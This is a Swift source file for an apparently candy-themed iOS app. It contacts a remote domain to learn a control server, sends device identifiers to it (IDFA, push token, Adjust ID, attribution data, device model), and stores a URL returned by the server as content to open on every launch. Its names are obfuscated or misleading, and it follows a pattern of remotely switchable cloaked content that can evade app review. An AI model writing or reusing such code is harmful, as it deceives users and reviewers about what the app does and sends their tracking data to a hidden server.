
import SwiftUI
import AdjustSdk
@preconcurrency import WebKit

let link = "https://sweettowncandy.com/sweets.json"

private var asdasd: String = {
    WKWebView().value(forKey: "userAgent") as? String ?? ""
}()

@MainActor
class ViewModel: ObservableObject {
    @Published var managerKey: String? = nil
    @Published var isLoaded = false
    @Published var isHave = false
    
    init() {
        Task {
            await checkIfManager()
        }
    }
    
    func checkIfManager() async {
        if let taskLink = UserDefaults.standard.string(forKey: "taskLink") {
            if taskLink.isEmpty {
                return
            }
            await openSameTask()
            return
        }
        
        if UserDefaults.standard.string(forKey: "controlsLink") == nil {
            await configureManager()
        }
        
        let idfa = UserDefaults.standard.string(forKey: "idfa") ?? ""
        let fcmToken = UserDefaults.standard.string(forKey: "fcmToken") ?? "null"
        let adid = await Adjust.adid() ?? ""
        let device = UIDevice.current.model
        let queryItems: [URLQueryItem] = [
            URLQueryItem(name: "firebase_push_token", value: fcmToken),
            URLQueryItem(name: "adjust_id", value: adid),
            URLQueryItem(name: "idfa", value: idfa),
            URLQueryItem(name: "device_model", value: device)
        ]
        
        let domainLink = UserDefaults.standard.string(forKey: "controlsLink") ?? ""
        
        guard !domainLink.isEmpty else {
            isLoaded = true
            return
        }
        
        var contentComponents = URLComponents(string: domainLink)
        contentComponents?.queryItems = queryItems
        
        guard let controlsLink = contentComponents?.url else {
            isLoaded = true
            return
        }
        
        let userAgent = asdasd
        
        var request = URLRequest(url: controlsLink)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
        
        for _ in 0..<5 {
            if let jsonString = UserDefaults.standard.string(forKey: "lastAdjustAttribution"),
               let jsonData = jsonString.data(using: .utf8) {
                if jsonData.isEmpty {
                    break
                }
            }
            try? await Task.sleep(nanoseconds: 1_000_000_000)
        }
        
        var adjustDict: [String: Any] = [:]
        
        if let jsonString = UserDefaults.standard.string(forKey: "lastAdjustAttribution"),
           let jsonData = jsonString.data(using: .utf8) {
            do {
                if let jsonDict = try JSONSerialization.jsonObject(with: jsonData, options: []) as? [String: Any] {
                    adjustDict = [
                        "trackerToken": jsonDict["trackerToken"] as? String ?? "",
                        "trackerName": jsonDict["trackerName"] as? String ?? "",
                        "network": jsonDict["network"] as? String ?? "",
                        "campaign": jsonDict["campaign"] as? String ?? "",
                        "adgroup": jsonDict["adgroup"] as? String ?? "",
                        "creative": jsonDict["creative"] as? String ?? "",
                        "clickLabel": jsonDict["clickLabel"] as? String ?? "",
                        "costType": jsonDict["costType"] as? String ?? "",
                        "costAmount": jsonDict["costAmount"] as? Double ?? 0,
                        "costCurrency": jsonDict["costCurrency"] as? String ?? "",
                        "jsonResponse": jsonString
                    ]
                    
                    print("Adjust dict: \(adjustDict)")
                }
            } catch {
                print("Error decoding Adjust JSON from UserDefaults: \(error)")
            }
        } else {
            print("No Adjust attribution JSON found in UserDefaults")
        }
        
        let body: [String: Any] = [
            "adjust": adjustDict,
            "referrer": "utm_source=appstore&utm_medium=organic"
        ]
        
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: body)
            request.httpBody = jsonData
            
            let (data, response) = try await URLSession.shared.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                if !(200...299).contains(httpResponse.statusCode) {
                    isLoaded = true
                    return
                }
            }
            
            let decoder = JSONDecoder()
            let clientResponse = try decoder.decode(DetailReady.self, from: data)
            
            UserDefaults.standard.set(clientResponse.client_id, forKey: "client_id")
            
            if let taskLink = clientResponse.response, URL(string: taskLink) != nil {
                UserDefaults.standard.set(taskLink, forKey: "taskLink")
                await MainActor.run {
                    managerKey = taskLink
                }
            } else {
                isLoaded = true
            }
            
        } catch {
            print("[checkIfManager] Error during network request or decoding: \(error.localizedDescription)")
        }
    }
    
    func setupManagerContent() async -> String? {
        do {
            let userAgent = asdasd
            
            var request = URLRequest(url: URL(string: "\(link)?action=check_info")!)
            request.httpMethod = "GET"
            request.setValue(UserDefaults.standard.string(forKey: "userId") ?? "1", forHTTPHeaderField: "client-uuid")
            request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
            
            print(userAgent)
            
            let (_, dataResponse) = try await URLSession.shared.data(for: request)
            if let httpResponse = dataResponse as? HTTPURLResponse {
                if let headerString = httpResponse.allHeaderFields["service-link"] as? String {
                    return headerString
                }
            } else {
                isLoaded = true
            }
        } catch {
            print("Error: \(error.localizedDescription)")
        }
        return nil
    }
    
    func configureManager() async {
        var userId = UserDefaults.standard.string(forKey: "userId") ?? ""
        
        if userId.isEmpty {
            userId = UUID().uuidString
            UserDefaults.standard.set(userId, forKey: "userId")
        }
        
        guard let response = await setupManagerContent() else {
            isLoaded = true
            return
        }
        
        if URL(string: response) != nil {
            UserDefaults.standard.set(response, forKey: "controlsLink")
        }
    }
    
    func openSameTask() async {
        guard let clientId = UserDefaults.standard.string(forKey: "client_id") else {
            return
        }
        
        let idfa = UserDefaults.standard.string(forKey: "idfa") ?? ""
        
        let queryItems: [URLQueryItem] = [
            URLQueryItem(name: "client_id", value: clientId),
            URLQueryItem(name: "idfa", value: idfa)
        ]
        
        guard let domainLink = UserDefaults.standard.string(forKey: "controlsLink"),
              !domainLink.isEmpty,
              var contentComponents = URLComponents(string: domainLink) else {
            isLoaded = true
            return
        }
        
        contentComponents.queryItems = queryItems
        
        guard let controlsLink = contentComponents.url else {
            isLoaded = true
            return
        }
        
        var request = URLRequest(url: controlsLink)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(UserDefaults.standard.string(forKey: "userId") ?? "1", forHTTPHeaderField: "client-uuid")
        request.setValue(UserDefaults.standard.string(forKey: "customAgent") ?? "1", forHTTPHeaderField: "User-Agent")
        
        let body: [String: Any] = [
            "client_id": clientId
        ]
        
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: body)
            request.httpBody = jsonData
            
            let (data, response) = try await URLSession.shared.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                if !(200...299).contains(httpResponse.statusCode) {
                    isLoaded = true
                    return
                }
            }
            
            let decoder = JSONDecoder()
            let clientResponse = try decoder.decode(DetailReady.self, from: data)
            
            if let taskLink = clientResponse.response, URL(string: taskLink) != nil {
                UserDefaults.standard.set(taskLink, forKey: "taskLink")
                await MainActor.run {
                    managerKey = taskLink
                }
            } else {
                isLoaded = true
            }
        } catch {
            print("[openSameTask] Error during network request or decoding: \(error.localizedDescription)")
        }
    }
}

class DetailReady: Codable {
    var client_id: String
    var response: String?
    
    enum CodingKeys: String, CodingKey, CaseIterable {
        case client_id
        case response
    }
}
